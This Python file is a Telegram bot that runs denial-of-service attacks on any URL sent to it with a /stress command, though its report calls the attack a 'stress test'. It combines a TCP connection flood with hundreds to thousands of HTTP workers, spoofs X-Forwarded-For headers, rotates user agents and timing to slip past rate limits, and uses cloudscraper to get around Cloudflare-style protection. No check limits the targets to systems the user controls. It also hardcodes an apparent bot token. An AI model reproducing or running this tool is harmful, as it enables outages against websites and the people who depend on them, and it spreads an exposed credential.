#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import socket
import ssl
import cloudscraper
import threading
import time
import logging
import urllib.parse
import sys
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from fake_useragent import UserAgent

# System configuration
try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
except (ImportError, ValueError):
    print("Warning: Could not increase file descriptor limit")

# Configuration
BOT_TOKEN = "7729228849:AAHv1rMlNFeoGaI2GJO2_N0-PoOkenZhUg4"
MAX_TEST_DURATION = 4200  # 3 hours maximum
MAX_WORKERS = 1500  # Extreme worker count
MAX_CONCURRENT_ATTACKS = 10  # Number of automatic attack sequences
REQUEST_TIMEOUT = 30
ROTATION_INTERVAL = 300

# Enhanced User Agents
ua = UserAgent()
USER_AGENTS = [
    ua.chrome, ua.firefox, ua.safari, ua.edge,
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)"
]

# Attack profiles
ATTACK_PROFILES = {
    "standard": {
        "workers": 300,
        "duration": 60,
        "tcp_intensity": 50
    },
    "intense": {
        "workers": 800,
        "duration": 120,
        "tcp_intensity": 100
    },
    "extreme": {
        "workers": 1500,
        "duration": 300,
        "tcp_intensity": 200
    }
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('stress_test.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class AttackResult:
    def __init__(self):
        self.reset()
        
    def reset(self):
        self.total_requests = 0
        self.successful = 0
        self.blocked = 0
        self.errors = 0
        self.challenges = 0
        self.ratelimit_hits = 0
        self.bypassed = 0
        self.tcp_sent = 0
        self.start_time = time.time()
        self.last_rotation = time.time()
        self.current_profile = 0
        self.current_strategy = 0

    def rotate_techniques(self):
        if time.time() - self.last_rotation > ROTATION_INTERVAL:
            self.current_profile = (self.current_profile + 1) % 4
            self.current_strategy = (self.current_strategy + 1) % 3
            self.last_rotation = time.time()

    def duration(self):
        return time.time() - self.start_time

    def requests_per_second(self):
        return self.total_requests / max(1, self.duration())

def enhanced_tcp_flood(target_ip, target_port, duration, result, intensity=50):
    """Optimized TCP flood with connection pooling"""
    end_time = time.time() + duration
    ssl_context = ssl.create_default_context()
    connection_pool = []
    
    # Create initial connection pool
    for _ in range(intensity):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            if target_port == 443:
                sock = ssl_context.wrap_socket(sock, server_hostname=target_ip)
            sock.connect((target_ip, target_port))
            connection_pool.append(sock)
        except Exception as e:
            logger.debug(f"TCP connection failed: {str(e)}")
            continue
    
    while time.time() < end_time and not result.errors > 1000:
        try:
            if not connection_pool:
                # Replenish pool if empty
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if target_port == 443:
                    sock = ssl_context.wrap_socket(sock, server_hostname=target_ip)
                sock.connect((target_ip, target_port))
                connection_pool.append(sock)
                
            sock = random.choice(connection_pool)
            sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            result.tcp_sent += 1
            time.sleep(0.001)
        except Exception as e:
            logger.debug(f"TCP error: {str(e)}")
            try:
                sock.close()
                connection_pool.remove(sock)
            except:
                pass
    
    # Cleanup
    for sock in connection_pool:
        try:
            sock.close()
        except:
            pass

async def send_evasive_request(session, url, result):
    """Send request with advanced evasion techniques"""
    try:
        # Apply current anti-ratelimit strategy
        if result.current_strategy == 0:
            await asyncio.sleep(random.uniform(0.01, 0.1))
        elif result.current_strategy == 1:
            await asyncio.sleep(random.uniform(0.05, 0.3))
        
        # Build headers
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": random.choice(["keep-alive", "close"]),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

        # Choose random method
        method = random.choice(["GET", "POST", "HEAD"])
        
        # For POST requests, add random data
        data = None
        if method == "POST":
            data = {"random_data": str(random.randint(1, 100000))}
            
        async with session.request(method, url, headers=headers, data=data) as resp:
            return await handle_response(resp, result)
                
    except Exception as e:
        result.errors += 1
        logger.debug(f"Request failed: {str(e)}")
        return False

async def handle_response(response, result):
    """Process server response"""
    result.total_requests += 1
    
    if response.status == 200:
        result.successful += 1
        return True
    elif response.status in [403, 503, 429, 418]:
        result.blocked += 1
        if response.status == 429:
            result.ratelimit_hits += 1
            # Rotate strategy when hitting ratelimits
            result.current_strategy = (result.current_strategy + 1) % 3
        
        if any(x in response.headers.get("server", "").lower() for x in ["cloudflare", "vercel", "netlify"]):
            if await advanced_bypass(str(response.url), result):
                result.bypassed += 1
                return True
    else:
        result.errors += 1
    
    return False

async def advanced_bypass(url, result):
    """Advanced protection bypass with rotation"""
    try:
        result.rotate_techniques()
        scraper = cloudscraper.create_scraper()
        
        # First request
        resp = scraper.get(url, timeout=REQUEST_TIMEOUT)
        
        # If challenged, retry
        if resp.status_code in [403, 503, 429, 418]:
            result.challenges += 1
            resp = scraper.get(url, timeout=REQUEST_TIMEOUT)
        
        return resp.status_code == 200
    
    except Exception as e:
        logger.error(f"Bypass failed: {str(e)}")
        return False

async def attack_worker(session, base_url, port, duration, result):
    """Optimized attack worker with adaptive techniques"""
    end_time = time.time() + duration
    paths = ["/", "/api", "/wp-admin", "/contact", "/blog", "/static/file.js"]
    
    while time.time() < end_time and not result.errors > 1000:
        path = random.choice(paths)
        target_url = f"{base_url}:{port}{path}" if port not in [80, 443] else f"{base_url}{path}"
        await send_evasive_request(session, target_url, result)

async def execute_attack_sequence(target_url, port, attack_params, result, attack_id):
    """Execute one attack sequence with given parameters"""
    logger.info(f"Starting attack sequence {attack_id} on {target_url}")
    
    parsed_url = urllib.parse.urlparse(target_url)
    target_ip = socket.gethostbyname(parsed_url.netloc)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # Start TCP flood
    tcp_thread = threading.Thread(
        target=enhanced_tcp_flood,
        args=(target_ip, port, attack_params['duration'], result, attack_params['tcp_intensity']),
        daemon=True
    )
    tcp_thread.start()
    
    # Configure HTTP client
    connector = aiohttp.TCPConnector(
        limit=0,
        force_close=False,
        enable_cleanup_closed=True,
        ssl=False
    )
    
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for _ in range(min(attack_params['workers'], MAX_WORKERS)):
            task = asyncio.create_task(
                attack_worker(session, base_url, port, attack_params['duration'], result)
            )
            tasks.append(task)
        
        await asyncio.gather(*tasks)
    
    tcp_thread.join()
    logger.info(f"Completed attack sequence {attack_id}")

async def launch_concurrent_attacks(target_url, port, attack_profile):
    """Launch multiple concurrent attack sequences"""
    result = AttackResult()
    attack_params = ATTACK_PROFILES[attack_profile]
    
    attack_tasks = []
    for i in range(MAX_CONCURRENT_ATTACKS):
        task = asyncio.create_task(
            execute_attack_sequence(target_url, port, attack_params, result, i+1)
        )
        attack_tasks.append(task)
        await asyncio.sleep(0.1)  # Stagger startup
    
    await asyncio.gather(*attack_tasks)
    return result

@dp.message(Command("stress"))
async def stress_test_handler(message: types.Message):
    """Handle stress test command with automatic multi-attack"""
    try:
        args = message.text.split()
        if len(args) < 2:
            await message.reply("Usage: /stress <url> [profile=standard]\nProfiles: standard, intense, extreme")
            return

        url = args[1]
        profile = args[2] if len(args) > 2 else "standard"
        
        if not url.startswith(("http://", "https://")):
            url = f"http://{url}"
            
        if profile not in ATTACK_PROFILES:
            await message.reply(f"Invalid profile. Choose from: {', '.join(ATTACK_PROFILES.keys())}")
            return

        port = 80 if url.startswith("http://") else 443
        
        # Send initial response
        attack_msg = await message.reply(
            f"🚀 Launching {MAX_CONCURRENT_ATTACKS} concurrent attack sequences\n"
            f"🔗 Target: {url}\n"
            f"⚡ Profile: {profile}\n"
            "🔄 Starting attacks..."
        )
        
        # Run attacks
        start_time = time.time()
        result = await launch_concurrent_attacks(url, port, profile)
        test_duration = time.time() - start_time
        
        # Generate final report
        report = f"""
🔥 ULTIMATE STRESS TEST RESULTS 🔥

🔗 Target: {url}
⚡ Profile: {profile.upper()}
⏱ Duration: {test_duration:.2f}s
🧩 Attack Sequences: {MAX_CONCURRENT_ATTACKS}

📊 Traffic Stats:
  • Total Requests: {result.total_requests:,}
  • Successful: {result.successful:,} ({result.successful/max(1, result.total_requests):.1%})
  • Blocked: {result.blocked:,}
  • Errors: {result.errors:,}
  • RPS: {result.requests_per_second():.1f}

🛡 Protection Stats:
  • Challenges: {result.challenges:,}
  • Rate Limits: {result.ratelimit_hits:,}
  • Bypassed: {result.bypassed:,}
  • TCP Packets: {result.tcp_sent:,}

💡 Security Assessment:
  • Protection: {'🟢 Weak' if result.successful > result.blocked*2 else '🟡 Moderate' if result.successful > result.blocked else '🔴 Strong'}
  • Bypass Rate: {result.bypassed/max(1, result.blocked):.1%}
"""
        await attack_msg.edit_text(report)

    except Exception as e:
        await message.reply(f"❌ Attack failed: {str(e)}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBot stopped by user")
    except Exception as e:
        print(f"Fatal error: {str(e)}")
